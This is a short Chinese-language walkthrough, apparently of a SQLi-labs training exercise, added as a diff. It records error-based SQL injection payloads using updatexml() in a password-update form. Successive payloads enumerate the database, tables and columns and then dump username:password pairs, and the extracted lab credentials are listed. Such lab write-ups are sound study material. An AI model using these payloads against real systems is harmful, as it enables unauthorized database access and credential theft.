@@ -1,0 +1,31 @@
+uname=admin&passwd=123&submit=Submit
+显示成功修改flag1.jpg
+uname=admin'&passwd=123&submit=Submit
+显示修改失败slap1.jpg（它让我滚
+推测sql语句为：update 表名 set passwd = '输入的密码' where uname = 'uname';
+
+uname=admin&passwd=123' or updatexml(1,concat(0x7e,database(),0x7e),1) --+&submit=Submit
+显示数据库名为security
+uname=admin&passwd=123' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) --+&submit=Submit
+推测表名应为users
+uname=admin&passwd=123' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e),1) --+&submit=Submit
+推测username和password分别对应用户名和密码
+uname=admin&passwd=123' or updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+&submit=Submit
+会发现显示不全，对于返回结果的字符数有限制，故修改limit范围来遍历显示用户信息
+uname=admin&passwd=123' or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+&submit=Submit
+据此编写脚本
+运行脚本，得出字段值
+Dumb:1
+Angelina:1
+Dummy:1
+secure:1
+stupid:1
+superman:1
+batman:1
+admin:1
+admin1:1
+admin2:1
+admin3:1
+dhakkan:1
+admin4:1
+
